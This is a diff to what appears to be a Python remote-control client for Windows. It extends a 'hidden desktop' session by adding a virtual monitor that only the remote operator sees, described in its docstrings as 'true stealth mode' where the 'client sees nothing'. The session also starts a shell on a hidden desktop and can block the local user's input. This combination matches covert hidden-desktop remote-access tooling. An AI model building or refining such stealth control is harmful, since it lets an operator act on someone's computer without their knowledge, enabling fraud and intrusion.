@@ -1,4 +1,11 @@
-"""Hidden desktop helpers for Windows manage sessions."""
+"""Hidden desktop helpers for Windows manage sessions.
+
+Supports two modes:
+1. Virtual Display Mode (recommended): Uses IDD driver to create a real virtual
+   monitor that can be captured. Provides true isolation - client sees nothing.
+2. Fallback Mode: Captures from primary display, input goes to main desktop.
+   Client can see operator's actions.
+"""
 from __future__ import annotations
 
 import asyncio
@@ -35,6 +42,17 @@ from remote_client.control.input_controller import (
 from remote_client.media.stream_profiles import AdaptiveStreamProfile
 
 logger = logging.getLogger(__name__)
+
+# Try to import virtual display support
+try:
+    from remote_client.windows.virtual_display import (
+        VirtualDisplaySession,
+        check_virtual_display_support,
+    )
+    VIRTUAL_DISPLAY_AVAILABLE = True
+except ImportError:
+    VIRTUAL_DISPLAY_AVAILABLE = False
+    VirtualDisplaySession = None
 
 if platform.system() == "Windows":
     from ctypes import wintypes
@@ -326,11 +344,11 @@ def _create_display_dc():
 
 
 class HiddenDesktopCapture:
-    """Capture screen using mss from the PRIMARY display.
+    """Capture screen using mss.
     
-    Hidden desktops in Windows don't have a graphical buffer - they are 
-    isolated process spaces but not for rendering. So we capture from 
-    the main screen while input goes to the hidden desktop.
+    Supports two modes:
+    1. Virtual Display Mode: Captures from a virtual monitor (if available)
+    2. Fallback Mode: Captures from the primary display
     """
     
     def __init__(
@@ -339,6 +357,8 @@ class HiddenDesktopCapture:
         desktop_path: str | None = None,
         draw_cursor: bool = False,
         fps: int = 30,
+        monitor_index: int | None = None,
+        monitor_region: dict | None = None,
     ) -> None:
         self._desktop_handle = desktop_handle
         self._desktop_path = desktop_path
@@ -351,6 +371,8 @@ class HiddenDesktopCapture:
         self._frame_size = (0, 0)
         self._sct = None
         self._monitor = None
+        self._target_monitor_index = monitor_index
+        self._target_monitor_region = monitor_region
         self._thread = threading.Thread(target=self._run, daemon=True)
         self._thread.start()
 
@@ -364,6 +386,12 @@ class HiddenDesktopCapture:
 
     def set_draw_cursor(self, enabled: bool) -> None:
         self._draw_cursor = bool(enabled)
+    
+    def set_monitor(self, index: int | None = None, region: dict | None = None) -> None:
+        """Change the monitor to capture from."""
+        self._target_monitor_index = index
+        self._target_monitor_region = region
+        # Will be applied on next capture cycle
 
     def get_frame(self, timeout: float = 0.6) -> tuple[bytes | None, tuple[int, int]]:
         deadline = time.monotonic() + timeout
@@ -386,27 +414,59 @@ class HiddenDesktopCapture:
             self._sct = None
 
     def _init_mss(self) -> bool:
-        """Initialize mss for screen capture from primary display."""
+        """Initialize mss for screen capture."""
         try:
             import mss
             self._sct = mss.mss()
-            monitors = self._sct.monitors
-            if not monitors:
-                logger.warning("Hidden desktop: no monitors found")
-                return False
-            # Use primary monitor (index 1) or full virtual screen (index 0)
-            index = 1 if len(monitors) > 1 else 0
-            self._monitor = monitors[index]
+            return self._select_monitor()
+        except Exception as exc:
+            logger.warning("Hidden desktop: mss init failed: %s", exc)
+            return False
+    
+    def _select_monitor(self) -> bool:
+        """Select the monitor to capture from."""
+        if not self._sct:
+            return False
+        
+        monitors = self._sct.monitors
+        if not monitors:
+            logger.warning("Hidden desktop: no monitors found")
+            return False
+        
+        # Priority 1: Use specified region (for virtual display)
+        if self._target_monitor_region:
+            self._monitor = self._target_monitor_region
             self._frame_size = (
                 int(self._monitor["width"]),
                 int(self._monitor["height"]),
             )
-            logger.info("Hidden desktop: mss initialized, monitor=%s, size=%dx%d", 
-                        index, self._frame_size[0], self._frame_size[1])
+            logger.info("Hidden desktop: using custom region, size=%dx%d", 
+                        self._frame_size[0], self._frame_size[1])
             return True
-        except Exception as exc:
-            logger.warning("Hidden desktop: mss init failed: %s", exc)
-            return False
+        
+        # Priority 2: Use specified monitor index
+        if self._target_monitor_index is not None:
+            if self._target_monitor_index < len(monitors):
+                self._monitor = monitors[self._target_monitor_index]
+                self._frame_size = (
+                    int(self._monitor["width"]),
+                    int(self._monitor["height"]),
+                )
+                logger.info("Hidden desktop: using monitor %d, size=%dx%d", 
+                            self._target_monitor_index, 
+                            self._frame_size[0], self._frame_size[1])
+                return True
+        
+        # Fallback: Use primary monitor (index 1) or full virtual screen (index 0)
+        index = 1 if len(monitors) > 1 else 0
+        self._monitor = monitors[index]
+        self._frame_size = (
+            int(self._monitor["width"]),
+            int(self._monitor["height"]),
+        )
+        logger.info("Hidden desktop: using primary monitor %d, size=%dx%d", 
+                    index, self._frame_size[0], self._frame_size[1])
+        return True
 
     def _capture_mss(self) -> bytes | None:
         """Capture frame using mss."""
@@ -421,7 +481,7 @@ class HiddenDesktopCapture:
             return None
 
     def _run(self) -> None:
-        # Initialize mss for capturing from primary display
+        # Initialize mss for capturing
         if not self._init_mss():
             logger.error("Hidden desktop: failed to initialize screen capture")
             return
@@ -429,6 +489,11 @@ class HiddenDesktopCapture:
         try:
             while not self._stop_event.is_set():
                 start = time.monotonic()
+                
+                # Check if monitor needs to be updated
+                if self._target_monitor_region or self._target_monitor_index is not None:
+                    self._select_monitor()
+                
                 data = self._capture_mss()
                 if data:
                     with self._frame_lock:
@@ -526,8 +591,14 @@ class HiddenDesktopTrack(MediaStreamTrack):
 
 
 class HiddenDesktopInputController:
+    """Input controller that sends input to the PRIMARY desktop.
+    
+    Since we capture from the main screen (hidden desktops have no graphical buffer),
+    input must also go to the main desktop for the user to see the effects.
+    """
+    
     def __init__(self, desktop_handle, screen_size: tuple[int, int]) -> None:
-        self._desktop_handle = desktop_handle
+        self._desktop_handle = desktop_handle  # Kept for API compatibility
         self._screen_size = screen_size
         self._queue: queue.Queue[ControlCommand] = queue.Queue()
         self._stop_event = threading.Event()
@@ -621,8 +692,9 @@ class HiddenDesktopInputController:
                 self._fallback.text(command.text)
 
     def _run(self) -> None:
-        if not _set_thread_desktop(self._desktop_handle):
-            return
+        # DO NOT switch to hidden desktop - input goes to main desktop
+        # since we're capturing from main screen (hidden desktop has no graphical buffer)
+        logger.info("Hidden desktop input controller started (input goes to main desktop)")
         while not self._stop_event.is_set():
             try:
                 command = self._queue.get(timeout=0.2)
@@ -635,20 +707,51 @@ class HiddenDesktopInputController:
 
 
 class HiddenDesktopSession:
-    def __init__(self) -> None:
+    """Hidden desktop session with optional virtual display support.
+    
+    When virtual display is available and enabled:
+    - Creates a virtual monitor that only the operator can see
+    - Client sees nothing - true stealth mode
+    - Input is sent to the virtual display coordinates
+    
+    When virtual display is not available (fallback):
+    - Captures from the primary display
+    - Client can see what operator is doing
+    - Input goes to the main desktop
+    """
+    
+    def __init__(self, use_virtual_display: bool = True) -> None:
         if platform.system() != "Windows":
             raise RuntimeError("Hidden desktop is only supported on Windows.")
+        
         self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
         self._desktop_handle = _create_desktop(self._desktop_name)
         self._desktop_path = f"WinSta0\\{self._desktop_name}"
         self._processes: list[subprocess.Popen] = []
         self._input_blocked = False
+        self._virtual_display: VirtualDisplaySession | None = None
+        self._use_virtual_display = use_virtual_display and VIRTUAL_DISPLAY_AVAILABLE
+        self._virtual_display_active = False
+        
         self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
             "1",
             "true",
             "yes",
             "on",
         }
+        
+        # Try to initialize virtual display
+        monitor_index = None
+        monitor_region = None
+        
+        if self._use_virtual_display:
+            self._virtual_display_active = self._init_virtual_display()
+            if self._virtual_display_active and self._virtual_display:
+                monitor_region = self._virtual_display.get_capture_region()
+                logger.info("Hidden desktop: using virtual display for capture")
+            else:
+                logger.info("Hidden desktop: virtual display not available, using primary monitor")
+        
         self._start_shell()
 
         self._capture = HiddenDesktopCapture(
@@ -656,16 +759,41 @@ class HiddenDesktopSession:
             desktop_path=self._desktop_path,
             draw_cursor=False,
             fps=30,
+            monitor_index=monitor_index,
+            monitor_region=monitor_region,
         )
         size = self._capture.frame_size
         deadline = time.monotonic() + 1.0
         while size == (0, 0) and time.monotonic() < deadline:
             time.sleep(0.05)
             size = self._capture.frame_size
+        
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
+        
         if self._block_local_input:
             self.block_local_input()
+    
+    def _init_virtual_display(self) -> bool:
+        """Initialize virtual display if available."""
+        if not VIRTUAL_DISPLAY_AVAILABLE or VirtualDisplaySession is None:
+            return False
+        
+        try:
+            self._virtual_display = VirtualDisplaySession()
+            # Try to start with 1920x1080 resolution
+            if self._virtual_display.start(width=1920, height=1080, auto_install=False):
+                logger.info("Virtual display started: %dx%d", 
+                            *self._virtual_display.resolution)
+                return True
+            else:
+                logger.warning("Failed to start virtual display")
+                self._virtual_display = None
+                return False
+        except Exception as exc:
+            logger.warning("Virtual display initialization failed: %s", exc)
+            self._virtual_display = None
+            return False
 
     def _start_shell(self) -> None:
         startupinfo = subprocess.STARTUPINFO()
@@ -704,11 +832,32 @@ class HiddenDesktopSession:
         if self._input_blocked:
             _toggle_block_input(False)
             self._input_blocked = False
+    
+    @property
+    def is_virtual_display_active(self) -> bool:
+        """Check if virtual display is being used."""
+        return self._virtual_display_active
+    
+    @property
+    def mode(self) -> str:
+        """Get the current operating mode."""
+        if self._virtual_display_active:
+            return "virtual_display"
+        return "fallback"
 
     def close(self) -> None:
         self.screen_track.stop()
         self.input_controller.close()
         self.unblock_local_input()
+        
+        # Stop virtual display
+        if self._virtual_display:
+            try:
+                self._virtual_display.stop()
+            except Exception:
+                pass
+            self._virtual_display = None
+        
         for proc in self._processes:
             try:
                 proc.terminate()
